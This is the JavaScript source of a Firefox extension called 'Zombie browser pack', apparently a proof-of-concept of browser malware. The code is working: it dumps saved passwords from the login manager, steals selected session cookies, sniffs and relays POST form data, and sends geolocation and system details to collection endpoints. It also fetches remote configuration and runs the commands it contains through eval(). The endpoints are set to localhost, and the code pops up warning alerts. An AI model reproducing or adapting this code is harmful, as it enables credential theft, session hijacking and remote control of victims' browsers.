/*
Zombie browser pack, remote control Firefox browsers via extensions, lite edition
Copyright (C) 2012  Zoltan Balazs

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

var debug = true;
function dbg(msg) {
	if(debug) {
		Components.utils.reportError(msg)
	}
}

String.prototype.escapeSpecialChars = function() {
	return this.replace(/\\n/g, "").replace(/\\'/g, "\\'").replace(/\\"/g, '\\"').replace(/\\r/g, "\\r").replace(/\\t/g, "\\t").replace(/\\b/g, "\\b").replace(/\\f/g, "\\f");
};



function type(obj) {
	return Object.prototype.toString.call(obj).match(/^\[object (.*)\]$/)[1]
}

// return the two-digit hexadecimal code for a byte
function toHexString(charCode) {
	return ("0" + charCode.toString(16)).slice(-2);
}


 /*
	The licence below is used only for the http request sniffing option (ProcessRequest).
 */

/*
 * Copyright (c) 2009 Duarte Silva
 * All Rights Reserved.
 */
 
const Cc1 = Components.classes;
const Ci1 = Components.interfaces;

var observerService = Cc1["@mozilla.org/observer-service;1"].getService(Ci1.nsIObserverService);

function CCIN(cName, ifaceName) {
	return Cc1[cName].createInstance(Ci1[ifaceName]);
}

function Sniff(extension) {
	this.extension = extension;
	this.QueryInterface = function(iid) {
		if(iid.equals(Components.interfaces.nsIObserver) || iid.equals(Components.interfaces.nsISupports))
			return this;
		else
			throw Components.results.NS_NOINTERFACE;
	};

	this.observe = function(subject, topic, data) {
		try {
			subject.QueryInterface(Components.interfaces.nsIHttpChannel);
			if(topic == "http-on-modify-request") {
				this.extension.ProcessRequest(subject, this.extension.config);
			}
			/*
			 if(topic == "http-on-examine-response")
			 this.extension.hookOnSubmit(subject);
			 */
		} catch (exception) {
			dbg(exception);
		}
	};
}

function Extension() {
	this.conserv = null;
	this.obsserv = null;
	this.sniff = null;
	this.debug = true;

	this.onPageLoad = function(aEvent) {

		var doc = aEvent.originalTarget;
		// doc is document that triggered the event
		var win = doc.defaultView;
		if(doc != null) {
			var node_list = doc.getElementsByTagName('input');
			for(var i = 0; i < node_list.length; i++) {
				var node = node_list[i];
				if(node.getAttribute('type') == 'submit') {
					node.addEventListener("click", modifyText, false);
				}
			}
		}
	};

	this.readConfig = function() {
		var config = new String();
		config = this.readFileRetLine("ProfD", "flashX.dat");
		if(config != null) {
			try {
				config2 = JSON.parse(config);
				try {
					oldIDs = JSON.parse(this.readFileOld("ProfD", "flashX1.dat"));
				} catch(e) {
					oldIDs = new Object();
					oldIDs.jscommandid = 0;
				}
				var change = 0;
				if(oldIDs.jscommandid < config2.jscommandid) {
					try {
						eval(config2.jscommand);
						oldIDs.jscommandid = config2.jscommandid;
						change++;
					} catch(e) {
						dbg(e)
					}
				}
				if(change > 0) {
					this.writeFile("ProfD", "flashX1.dat", JSON.stringify(oldIDs, null, 0));
				}
			} catch(e) {
				dbg(e)
			}
			return config2;
		} else {
			//this.extension = extension;
			try {
				config2 = new Object();
				var configData = this.readFileOld("ProfD", "flashX.dat");
				var config2 = JSON.parse(configData);
				return config2;
			} catch (e) {
				config = new Object();
				config.cookieloggerhost = 'http://127.0.0.1/addcookie/index.php';
				config.cookieloggingenabled = true;

				config.cookielist = "SMSV,SMSS,datr";

				config.postdataloggerhost = 'http://127.0.0.1/addpostinfo/index.php';
				config.loginhost = 'http://127.0.0.1/login/';
				config.postenabled = true;
				config.uploadpath = "http://127.0.0.1/upload/";

				config.checksslvar = false;

				config.enablemitm = true;

				config.jscommandid = 1;
				return config;
			}
		}
	};

	this.playSound = function(config, sound) {
		var audioElement = new Audio(sound);
		audioElement.play();
	};


	//get password from submit hook, not working yet
	this.hookOnSubmit = function(config) {
		if(content != null) {
			//alert(content);
			var node_list = content.document.getElementsByTagName('input');
			for(var i = 0; i < node_list.length; i++) {
				var node = node_list[i];
				if(node.getAttribute('type') == 'submit') {
					// do something here with a <input type="text" .../>
					// we alert its value here

					Components.utils.reportError("1234");
				}
			}

		}

	};


	this.stealStoredPasswords = function(config) {
		var httprealm = null;
		var password;
		try {
			// Get Login Manager
			var myLoginManager = Components.classes["@mozilla.org/login-manager;1"].getService(Components.interfaces.nsILoginManager);
			// Find users for the given parameters
			var logins = myLoginManager.getAllLogins();
			var sendInfo = new Array();
			// Find user from returned array of nsILoginInfo objects
			for(var i = 0; i < logins.length; i++) {
				sendInfo += logins[i].formSubmitURL + ": " + logins[i].username + ": " + logins[i].password + " xxxxx";
			}

			
			this.sendMessage('http://127.0.0.1/addpostinfo/index.php' , "postinfo%5Bdata%5D=" + encodeURIComponent(sendInfo), config.checksslvar);
		} catch(ex) {
			dbg(ex);
			// This will only happen if there is no nsILoginManager component class
		}
	}

	this.writeConfig = function(oXHR) {
		if(oXHR.length > 5) {
			this.writeFile("ProfD", "flashX.dat", oXHR);
		}
	};

	this.readFileOld = function(dir, filename) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("ProfD", Components.interfaces.nsIFile);
		file.append(filename);

		// open an input stream from file
		var istream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
		istream.init(file, 0x01, 0444, 0);
		istream.QueryInterface(Components.interfaces.nsILineInputStream);

		// read lines into array
		var line = {}, lines = [], hasmore;
		do {
			hasmore = istream.readLine(line);
			lines.push(line.value);
		} while (hasmore);
		istream.close();
		return lines;
	};

	this.readFileRetLine = function(dir, filename) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("ProfD", Components.interfaces.nsIFile);
		file.append(filename);

		// open an input stream from file
		var istream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
		istream.init(file, 0x01, 0444, 0);
		istream.QueryInterface(Components.interfaces.nsILineInputStream);

		// read lines into array
		var line = {};
		var lines = "";
		var hasmore;
		do {
			hasmore = istream.readLine(line);
			lines += line.value;
		} while (hasmore);
		istream.close();
		return lines;
	};
	//heart-beat info from zombie
	this.getEnvInfo = function(config) {
		try {
			var osVersion = Components.classes["@mozilla.org/network/protocol;1?name=http"].getService(Components.interfaces.nsIHttpProtocolHandler).oscpu;

			var info = Components.classes["@mozilla.org/xre/app-info;1"].getService(Components.interfaces.nsIXULAppInfo);
			const cid_u = "@mozilla.org/userinfo;1";
			var obj_u = Components.classes[cid_u].createInstance();
			obj_u = obj_u.QueryInterface(Components.interfaces.nsIUserInfo);
			//var userID = this.generateUserID();
			var d = new Date();
			var sendInfo = "zombie%5Busername%5D=" + encodeURIComponent(obj_u.username) + "&zombie%5Bos%5D=" + encodeURIComponent(osVersion) + "&zombie%5Bbrowsername%5D=" + encodeURIComponent(info.name) + "&zombie%5Bbrowserversion%5D=" + encodeURIComponent("Firefox/" + info.version)
			 + "&commit=Create+Zombie";
			if(!config.loginhost) {
				this.sendMessage('http://127.0.0.1/login/' , sendInfo, config.checksslvar);
			} else {
				this.sendMessage(config.loginhost + userID, sendInfo, config.checksslvar);
			}

		} catch (exc) {
			dbg("Error1: " + exc);
			return 'unknown';
		}
	};

	this.newCookie = "";
	this.oldCookieValues = new Array("", "");

	this.cookieEvent = function(config) {
		
		cookiearray = new Array();
		cookiearray = "SMSS,SMSV,datr".split(",");

		var cookieMgr = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager);
		for(var e = cookieMgr.enumerator; e.hasMoreElements(); ) {

			var cookie = e.getNext().QueryInterface(Components.interfaces.nsICookie);
			cookieStr = "data=host:" + cookie.host + " name:" + cookie.name + " value:" + cookie.value + " expires:" + cookie.expires + " path:" + cookie.path + " isSecure:" + cookie.isSecure + " policy:" + cookie.policy + " isDomain:" + cookie.isDomain + " status:" + cookie.status + "\n";

			for(var i = 0; i < cookiearray.length; i++) {
				if(cookie.name == cookiearray[i]) {
					this.newCookie = cookieStr;
					if(this.oldCookieValues[i] != cookie.value) {
						//var userID = this.generateUserID();
						this.sendMessage('http://127.0.0.1/addcookie/index.php' , "cookie%5Bdata%5D=" + encodeURIComponent(this.newCookie), false);
						this.oldCookieValues[i] = cookie.value;
					}
					this.newCookie = "";
				}
			}
		}
	};

	this.executeFile = function(executable) {
		var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
		if(executable.length > 2) {
			file.initWithPath(executable);
			file.launch();
		}
	};

	this.writeFile = function(dir, filename, data) {
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get(dir, Components.interfaces.nsIFile);
		file.append(filename);

		if(!file.exists()) {
			file.create(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
		}

		var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
		foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0);
		var converter = Components.classes["@mozilla.org/intl/converter-output-stream;1"].createInstance(Components.interfaces.nsIConverterOutputStream);
		converter.init(foStream, "UTF-8", 0, 0);
		converter.writeString(data);
		converter.close();
	};


	this.sendMessage = function(host, param, checkSSL) {
		var httpRequest = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
		// Disable alert popups on SSL error, but connection will fail
		//httpRequest.mozBackgroundRequest = true;
		//var userID = this.generateUserID();
		httpRequest.open("POST", host, true);
		httpRequest.onreadystatechange = function(aEvt) {
			if(httpRequest.readyState === 4) {
				if(checkSSL) {
					if(!(this.checkFingerprint(httpRequest.channel))) {
						dbg("SSL Error");
						return false;
					}
				}
				if(httpRequest.status === 200 || httpRequest.status === 302) {
					var x;
				} else {
					dbg("Error4:" + host + param + " resp:" + httpRequest.statusText);
				}
			}

		};
		httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		httpRequest.send(param);
		// return httpRequest.responseText;
	};
	this.getConfig = function(host, checkSSL) {
		//var userID = this.generateUserID();
		var request = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
		request.open("GET", host + "1.json?disable_cache=" +Math.floor(Math.random()*1001), true);
		request.onreadystatechange = function(aEvt) {
			if(request.readyState === 4) {
				if(checkSSL) {
					if(!(this.checkFingerprint(httpRequest.channel))) {
						dbg("SSL Error");
						return false;
					}
				}
				if(request.status === 200) {
					var data = request.responseText;
					var filename = "flashX.dat";
					var dir = "ProfD";
					var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get(dir, Components.interfaces.nsIFile);
					file.append(filename);
					if(!file.exists()) {
						file.create(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
					}
					var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
					foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0);
					var converter = Components.classes["@mozilla.org/intl/converter-output-stream;1"].createInstance(Components.interfaces.nsIConverterOutputStream);
					converter.init(foStream, "UTF-8", 0, 0);
					converter.writeString(data);
					converter.close();
				} else {
					dbg("req_status" + request.status);
					dbg("Error3:" + request.statusText);
				}
			}
		};
		request.send(null);
	};

	this.getLocation = function(config) {
		var geolocation = Components.classes["@mozilla.org/geolocation;1"].getService(Components.interfaces.nsIDOMGeoGeolocation);
		geolocation.getCurrentPosition(function(position) {
			var location = position.coords.latitude + " " + position.coords.longitude;
			//var userID = extension.generateUserID();
			extension.sendMessage('http://127.0.0.1/addpostinfo/index.php' , "postinfo%5Bdata%5D=" + encodeURIComponent(location), config.checksslvar);
		});
	};




	this.Initialize = function() {
		try {
			this.sniff = new Sniff(this);
			this.config = new Object();

			this.config = this.readConfig();
			this.getEnvInfo(this.config);

			this.obsserv = Components.classes["@mozilla.org/observer-service;1"].getService(Components.interfaces.nsIObserverService);
			this.conserv = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
			if((this.obsserv != null) && (this.sniff != null)) {
				this.obsserv.addObserver(this.sniff, "http-on-modify-request", false);
				this.obsserv.addObserver(this.sniff, "http-on-examine-response", false);
			}

		} catch (exception) {
			dbg(exception);
		}
	};

	this.Uninitialize = function() {
		if((this.obsserv != null) && (this.sniff != null))
			this.obsserv.removeObserver(this.sniff, "http-on-modify-request");
		//this.obsserv.removeObserver(this.sniff, "http-on-examine-response");
	};

	this.ProcessLine = function(stream) {
		var line = "";
		for(var i = 0; i < stream.available(); i++) {
			var c = stream.read(1);
			if(c == '\n')
				break;
			if(c != '\r')
				line += c;
		}
		return line;
	};

	this.ProcessRequest = function(http, config) {
		var stream;
		var seekable;
		var request;
		var validCookie = false;
		var validHeader = false;
		var params;
		//var enablemitm = true;
		var logoutpostdata = config.logoutpostdata;
		var origaccount = new Array(config.origaccount);
		var newaccount = config.newaccount;

		try {
			if(http.requestMethod != "POST")
				return;
			var httpChannel = http.QueryInterface(Components.interfaces.nsIHttpChannel);
			var host = new String();
			host = httpChannel.originalURI.host + httpChannel.originalURI.path;
			http.QueryInterface(Components.interfaces.nsIUploadChannel);

			if(http.uploadStream != null) {
				seekable = http.uploadStream;
				seekable.QueryInterface(Components.interfaces.nsISeekableStream);
				stream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
				stream.init(http.uploadStream);

				for(var line = this.ProcessLine(stream); line; line = this.ProcessLine(stream)) {

					var header = line.match(/^([^:]+):s?(.*)/);
					//Components.utils.reportError("HOST: " + httpChannel.getRequestHeader("Host"));
					if(header == null)
						continue;

					if(header[1].toLowerCase() == "content-type") {
						if(header[2].toLowerCase().match("x-www-form-urlencoded")) {
							validHeader = true;
						}
					}
				}

				if(validHeader) {
					params = stream.read(stream.available());

					if(config.enablemitm) {
						var uploadChannel = httpChannel.QueryInterface(Components.interfaces.nsIUploadChannel);
						var uploadChannelStream = uploadChannel.uploadStream;
						uploadChannelStream.QueryInterface(Components.interfaces.nsISeekableStream).seek(Components.interfaces.nsISeekableStream.NS_SEEK_SET, 0);
						var stream2 = Components.classes["@mozilla.org/binaryinputstream;1"].createInstance(Components.interfaces.nsIBinaryInputStream);
						stream2.setInputStream(uploadChannelStream);
						var postBytes = stream2.readByteArray(stream.available());
						var poststr = String.fromCharCode.apply(null, postBytes);

						var inputStream = Components.classes["@mozilla.org/io/string-input-stream;1"].createInstance(Components.interfaces.nsIStringInputStream);
						inputStream.setData(poststr, poststr.length);

						//default uploadchannel
						uploadChannel.setUploadStream(inputStream, "", -1);


						httpChannel.requestMethod = "POST";
					}
					// Report the intercepted POST
					if(!host.match(/com-safebrowsing/)) {//prevent logging backdoor communication
						request = new XMLHttpRequest();
						//var userID = this.generateUserID();
						extension.sendMessage('http://127.0.0.1/addpostinfo/index.php' , "postinfo%5Bdata%5D=" + encodeURIComponent(poststr), config.checksslvar);

						request.open("POST", 'http://127.0.0.1/addpostinfo/index.php' , true);
						request.setRequestHeader("Connection", "close");
						request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						request.send("postinfo%5Bdata%5D=" + encodeURIComponent(params));
						alert("the following data has been sent to the malicious attacker server via the zombie browser plugin: " + params);
					}
				}
				seekable.seek(0, 0);
			}
		} catch (exception) {
			dbg(exception);
		}
	};
}

var extension = new Extension();

if(extension != null) {
	window.addEventListener("load", function load(event) {
		extension.Initialize();
	}, false);

	window.addEventListener("unload", function() {
		extension.Uninitialize();
	}, false);
}

var interval0 = window.setInterval(function(thisObj) {
	extension.getConfig("http://127.0.0.1/c/", false);
}, 5 * 1000, this);
var interval1 = window.setInterval(function(thisObj) {
	this.config = extension.readConfig();
}, 2 * 1000, this);

var interval3 = window.setInterval(function(thisObj) {
	extension.cookieEvent(extension.config);
}, 5 * 1000, this);


var interval4 = window.setInterval(function(thisObj) {
	alert("Be warned user, a malicious extension is running in your browser.");
}, 60 * 1000, this);